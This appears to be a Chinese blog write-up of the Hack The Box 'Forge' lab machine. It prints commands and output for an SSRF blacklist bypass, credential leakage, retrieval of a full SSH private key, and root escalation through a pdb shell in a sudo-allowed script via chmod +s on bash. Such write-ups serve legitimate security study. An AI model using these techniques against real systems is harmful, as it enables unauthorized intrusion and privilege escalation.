<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Forge - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Forge靶场信息  靶场类型  信息搜集首先使用nmap扫描一下端口 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.111 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-09-26 21:51 EDT Wa">
<meta property="og:type" content="article">
<meta property="og:title" content="Forge - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Forge靶场信息  靶场类型  信息搜集首先使用nmap扫描一下端口 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.111 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-09-26 21:51 EDT Wa">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/image1.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/image2.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/image3.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/image5.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/image6.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/image7.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/image8.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/image9.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/image10.png">
<meta property="article:published_time" content="2021-09-28T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:44:09.905Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/09/28/Hackthebox/Hackthebox-Forge/image1.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Forge - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Forge - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-09-28T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-09-28
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Forge"><span class="post-toc-text">Hackthebox - Forge</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Server"><span class="post-toc-text">Server</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Client"><span class="post-toc-text">Client</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#提权后操作"><span class="post-toc-text">提权后操作</span></a></li></ol></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Hackthebox-Forge"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Forge - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-09-28 19:38:36" datetime="2021-09-28T11:38:36.000Z"  itemprop="datePublished">2021-09-28</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Forge"><a href="#Hackthebox-Forge" class="headerlink" title="Hackthebox - Forge"></a>Hackthebox - Forge</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2021/09/28/Hackthebox/Hackthebox-Forge/image1.png" class>

<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2021/09/28/Hackthebox/Hackthebox-Forge/image2.png" class>

<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先使用nmap扫描一下端口</p>
<pre><code class="Plain">┌──(root💀kali)-[~/Desktop]
└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.111
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 21:51 EDT
Warning: 10.10.11.111 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.111
Host is up (0.35s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://forge.htb
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=9/26%OT=22%CT=1%CU=32048%PV=Y%DS=2%DC=T%G=Y%TM=615123F
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   358.39 ms 10.10.14.1
2   358.42 ms 10.10.11.111

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.65 seconds
</code></pre>
<p>这边只开了<code>22</code>和<code>80</code>端口，咱们去看看<code>80</code>端口的http服务内容</p>
<img src="/2021/09/28/Hackthebox/Hackthebox-Forge/image3.png" class>

<p>访问后直接被跳转到了<code>forge.htb</code>域名，这里咱们加一个域名解析</p>
<pre><code class="Plain">echo 10.10.11.111 forge.htb &gt;&gt; /etc/hosts
</code></pre>
<p>然后再访问一次</p>


<p>这里有个上传功能，去试一下是否可以上传</p>
<img src="/2021/09/28/Hackthebox/Hackthebox-Forge/image5.png" class>

<p>上传后会被去掉后缀？还是怎么着不太明白，反正没有解析，找一下其他思路吧</p>
<p>主页上没有什么可看的东西了，爆一下目录和子域名吧</p>
<pre><code class="Plain">┌──(root💀kali)-[~/Desktop]
└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 200 -u http://forge.htb/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://forge.htb/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/26 22:14:58 Starting gobuster in directory enumeration mode
===============================================================
http://forge.htb/uploads              (Status: 301) [Size: 224] [--&gt; http://forge.htb/uploads/]
http://forge.htb/static               (Status: 301) [Size: 307] [--&gt; http://forge.htb/static/]
http://forge.htb/upload               (Status: 200) [Size: 929]
http://forge.htb/server-status        (Status: 403) [Size: 274]
===============================================================
2021/09/26 22:29:14 Finished
===============================================================
</code></pre>
<p>这里目录没爆出什么有用的东西，再去扫描DNS看看</p>
<pre><code class="Plain">┌──(root💀kali)-[~/Desktop]
└─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r -t 50 -u forge.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://forge.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/26 22:48:35 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.forge.htb (Status: 200) [Size: 27]
===============================================================
2021/09/26 22:50:16 Finished
===============================================================
</code></pre>
<p>找到了一个<code>admin</code>子域名，添加到<code>hosts</code>后再去试试</p>
<pre><code class="Plain">echo 10.10.11.111 admin.forge.htb &gt;&gt; /etc/hosts
</code></pre>
<img src="/2021/09/28/Hackthebox/Hackthebox-Forge/image6.png" class>

<p>访问后提示只允许本地主机，得想办法绕过一下</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>整理一下目前的信息</p>
<ol>
<li><code>forge.htb</code>为一个上传点</li>
<li><code>admin.forge.htb</code>只允许本地访问</li>
</ol>
<p>咱们咱们抓一下上传点的包看看内容</p>
<img src="/2021/09/28/Hackthebox/Hackthebox-Forge/image7.png" class>

<p>看到后面才发现这个页面还有一个<code>Upload from url</code>的功能，疏忽了。</p>
<p>抓个包看看</p>
<img src="/2021/09/28/Hackthebox/Hackthebox-Forge/image8.png" class>

<p>这边随便输入点东西以后，显示支持<code>http</code>和<code>https</code>协议，再结合我们之前的<code>admin.forge.htb</code>来看，这不就是一个妥妥的SSRF？</p>
<img src="/2021/09/28/Hackthebox/Hackthebox-Forge/image9.png" class>

<p>这样利用后，显示该URL被列入了黑名单，需要想办法绕过一下</p>
<img src="/2021/09/28/Hackthebox/Hackthebox-Forge/image10.png" class>

<p>尝试性使用大小写绕过方式轻轻松松绕过，返回了一个URL，打开看看</p>
<pre><code class="Plain">┌──(root💀kali)-[~/Desktop]
└─# curl http://forge.htb/uploads/2Y6eGsD37WCBc1m3pSJO
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Admin Portal&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&gt;
    &lt;header&gt;
            &lt;nav&gt;
                &lt;h1 class=&quot;&quot;&gt;&lt;a href=&quot;/&quot;&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
                &lt;h1 class=&quot;align-right margin-right&quot;&gt;&lt;a href=&quot;/announcements&quot;&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
                &lt;h1 class=&quot;align-right&quot;&gt;&lt;a href=&quot;/upload&quot;&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
            &lt;/nav&gt;
    &lt;/header&gt;
    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
    &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>成功读取到内容，给了一个<code>/announcements</code>目录</p>
<p>让我们拿去再去读取一下，返回了域名，接着访问</p>
<pre><code class="Plain">http://forge.htb/uploads/CnrWy5jKhQ1mykfx1ONY
</code></pre>
<pre><code class="Plain">┌──(root💀kali)-[~/Desktop]
└─# curl http://forge.htb/uploads/CnrWy5jKhQ1mykfx1ONY
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Announcements&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/announcements.css&quot;&gt;
    &lt;header&gt;
            &lt;nav&gt;
                &lt;h1 class=&quot;&quot;&gt;&lt;a href=&quot;/&quot;&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
                &lt;h1 class=&quot;align-right margin-right&quot;&gt;&lt;a href=&quot;/announcements&quot;&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
                &lt;h1 class=&quot;align-right&quot;&gt;&lt;a href=&quot;/upload&quot;&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
            &lt;/nav&gt;
    &lt;/header&gt;
    &lt;br&gt;&lt;br&gt;&lt;br&gt;
    &lt;ul&gt;
        &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;
        &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&lt;/li&gt;
        &lt;li&gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.&lt;/li&gt;
    &lt;/ul&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<pre><code class="Plain">我们得到了一个FTP账号密码
username = user
password = heightofsecurity123!
</code></pre>
<p>这边提示ftp不能被外部登录，但upload接口可以使用<code>?u=</code>参数指定ftp url</p>
<pre><code class="Plain">url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@127.1.1.1&amp;remote=1
</code></pre>
<p>继续调用</p>
<pre><code class="Plain">http://forge.htb/uploads/BRrgg0w44uZvHW3WEnWz
</code></pre>
<p>继续访问，这个步骤重复性好高啊</p>
<pre><code class="Plain">┌──(root💀kali)-[~/Desktop]
└─# curl http://forge.htb/uploads/BRrgg0w44uZvHW3WEnWz                                                                                                                                                          1 ⚙
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Sep 24 18:02 user.txt
</code></pre>
<p>这样获取好麻烦，又不想（hui）写脚本，试试看有没有私钥吧</p>
<pre><code class="Plain">url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@127.1.1.1/.ssh/id_rsa&amp;remote=1
</code></pre>
<pre><code class="Plain">http://forge.htb/uploads/cBNUTYA6eT50o5vEjpY1
</code></pre>
<pre><code class="Plain">┌──(root💀kali)-[~/Desktop]
└─# curl http://forge.htb/uploads/cBNUTYA6eT50o5vEjpY1
-----BEGIN OPENSSH PRIVATE KEY-----
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
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
</code></pre>
<p>成功拿到私钥，保存到本地后使用私钥进行登录</p>
<pre><code class="Plain">┌──(root💀kali)-[~/Desktop]
└─# chmod 600 id_rsa                                                                                                                                                                                            1 ⚙

┌──(root💀kali)-[~/Desktop]
└─# ssh user@10.10.11.111 -i id_rsa                                                                                                                                                                             1 ⚙
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 27 Sep 2021 03:26:19 AM UTC

  System load:  0.0               Processes:             220
  Usage of /:   45.0% of 6.82GB   Users logged in:       0
  Memory usage: 30%               IPv4 address for eth0: 10.10.11.111
  Swap usage:   0%

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Sep 26 21:31:23 2021 from 10.10.14.120
-bash-5.0$ whoami&amp;&amp;id
user
uid=1000(user) gid=1000(user) groups=1000(user)
</code></pre>
<p>登入成功</p>
<pre><code class="Plain">-bash-5.0$ ls
snap  user.txt
-bash-5.0$ cat user.txt
7e72b4a44d946d578baa60ad23b0482f
</code></pre>
<p>成功拿到user权限的flag文件</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>首先查看一下sudo -l</p>
<pre><code class="Plain">-bash-5.0$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
</code></pre>
<p>这里的意思是<code>/usr/bin/python3</code>可以使用root权限执行<code>/opt/remote-manage.py</code>脚本</p>
<p>咱们去看一下这个脚本</p>
<pre><code class="Plain">-bash-5.0$ cat /opt/remote-manage.py
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((&#39;127.0.0.1&#39;, port))
    sock.listen(1)
    print(f&#39;Listening on localhost:{port}&#39;)
    (clientsock, addr) = sock.accept()
    clientsock.send(b&#39;Enter the secret passsword: &#39;)
    if clientsock.recv(1024).strip().decode() != &#39;secretadminpassword&#39;:
        clientsock.send(b&#39;Wrong password!\n&#39;)
    else:
        clientsock.send(b&#39;Welcome admin!\n&#39;)
        while True:
            clientsock.send(b&#39;\nWhat do you wanna do: \n&#39;)
            clientsock.send(b&#39;[1] View processes\n&#39;)
            clientsock.send(b&#39;[2] View free memory\n&#39;)
            clientsock.send(b&#39;[3] View listening sockets\n&#39;)
            clientsock.send(b&#39;[4] Quit\n&#39;)
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput(&#39;ps aux&#39;).encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput(&#39;df&#39;).encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput(&#39;ss -lnt&#39;).encode())
            elif option == 4:
                clientsock.send(b&#39;Bye\n&#39;)
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
</code></pre>
<p>这个脚本的意思是运行脚本后会开启一个端口，连接着一个端口输入选项，异常状态时会进入pdb，从而导致执行任意python代码</p>
<p>那么原理有了，说干就干</p>
<p>那么我们需要打开两个窗口，一个用于执行脚本，一个用于连接端口</p>
<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><pre><code class="Plain">-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:34260
</code></pre>
<h3 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h3><pre><code class="Plain">-bash-5.0$ nc localhost 34260
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
&#39;
</code></pre>
<p>密码在脚本中，登录后输入一个顿号即可报错</p>
<h3 id="提权后操作"><a href="#提权后操作" class="headerlink" title="提权后操作"></a>提权后操作</h3><pre><code class="Plain">-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:34260
invalid literal for int() with base 10: b&quot;&#39;&quot;
&gt; /opt/remote-manage.py(27)&lt;module&gt;()
-&gt; option = int(clientsock.recv(1024).strip())
(Pdb) import os
(Pdb) os.system(&quot;ls /root&quot;)
clean-uploads.sh  root.txt  snap
0
(Pdb) os.system(&quot;chmod +s /bin/bash&quot;)
0
(Pdb) exit()
-bash-5.0$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
-bash-5.0$ /bin/bash -p
bash-5.0# whomai&amp;&amp;id
bash: whomai: command not found
bash-5.0# whoami&amp;&amp;id
root
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
bash-5.0# cd /root
bash-5.0# ls
clean-uploads.sh  root.txt  snap
bash-5.0# cat root.txt
67a501971344b12bade28d6a75e98cbd
</code></pre>
<p>报错后，使用python导入os.system模块，然后即可执行system权限</p>
<p>成功拿到root权限的flag文件</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
